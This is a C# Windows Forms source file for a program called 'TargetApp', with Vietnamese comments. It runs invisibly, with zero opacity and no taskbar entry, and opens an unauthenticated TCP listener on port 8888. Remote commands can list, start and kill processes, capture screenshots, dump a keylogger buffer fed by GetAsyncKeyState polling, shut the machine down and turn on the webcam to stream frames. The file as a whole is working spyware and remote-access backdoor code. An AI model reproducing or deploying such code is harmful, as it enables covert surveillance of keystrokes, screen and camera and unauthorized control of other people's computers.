using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;

namespace TargetApp
{
    public partial class Form1 : Form
    {
        TcpListener listener;
        const int PORT = 8888;

        // Webcam
        FilterInfoCollection videoDevices;
        VideoCaptureDevice videoSource;
        string lastWebcamFrame = "";

        // Keylogger
        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
        StringBuilder keyLogBuffer = new StringBuilder();
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            // Cấu hình chạy ẩn
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0; // Làm mờ hoàn toàn
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Chạy Socket Server ở luồng riêng
            Thread serverThread = new Thread(StartServer);
            serverThread.IsBackground = true;
            serverThread.Start();

            // Chạy Keylogger
            keylogTimer.Interval = 10;
            keylogTimer.Tick += KeylogTimer_Tick;
            keylogTimer.Start();
        }

        // --- XỬ LÝ SOCKET ---
        void StartServer()
        {
            try
            {
                listener = new TcpListener(IPAddress.Any, PORT);
                listener.Start();
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    Thread t = new Thread(HandleClient);
                    t.Start(client);
                }
            }
            catch { }
        }

        void HandleClient(object obj)
        {
            TcpClient client = (TcpClient)obj;
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[1024 * 5000]; // 5MB Buffer

            try
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    string req = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    string res = ProcessCommand(req);
                    byte[] resBytes = Encoding.UTF8.GetBytes(res);
                    stream.Write(resBytes, 0, resBytes.Length);
                }
            }
            catch { }
            client.Close();
        }

        // --- XỬ LÝ LỆNH ---
        string ProcessCommand(string cmd)
        {
            string[] p = cmd.Split('|');
            string action = p[0];
            string param = p.Length > 1 ? p[1] : "";

            switch (action)
            {
                case "LIST": // 1. List Process
                    string s = "";
                    foreach (var pr in Process.GetProcesses()) s += pr.Id + ":" + pr.ProcessName + ";";
                    return s;
                case "START": // 2. Start App
                    try { Process.Start(param); return "OK"; } catch { return "ERR"; }
                case "STOP": // 2. Stop App
                    try { Process.GetProcessById(int.Parse(param)).Kill(); return "OK"; } catch { return "ERR"; }
                case "SCREENSHOT": // 3. Screenshot
                    return GetScreen();
                case "KEYLOG": // 4. Keylog
                    string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
                case "SHUTDOWN": // 5. Shutdown
                    Process.Start("shutdown", "/s /t 0"); return "Bye";
                case "WEBCAM_ON": // 6. Webcam On
                    StartCam(); return "Cam On";
                case "WEBCAM_GET": // 6. Get Frame
                    return lastWebcamFrame;
                default: return "Unknown";
            }
        }

        // --- CHỨC NĂNG PHỤ ---
        string GetScreen()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        void KeylogTimer_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++)
            {
                if (GetAsyncKeyState(i) == -32767) keyLogBuffer.Append(((Keys)i).ToString() + " ");
            }
        }

        void StartCam()
        {
            if (videoSource != null && videoSource.IsRunning) return;
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0) return;
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += (s, ev) => {
                using (Bitmap bmp = (Bitmap)ev.Frame.Clone())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        lastWebcamFrame = Convert.ToBase64String(ms.ToArray());
                    }
                }
            };
            videoSource.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (videoSource != null && videoSource.IsRunning) videoSource.Stop();
        }
    }
}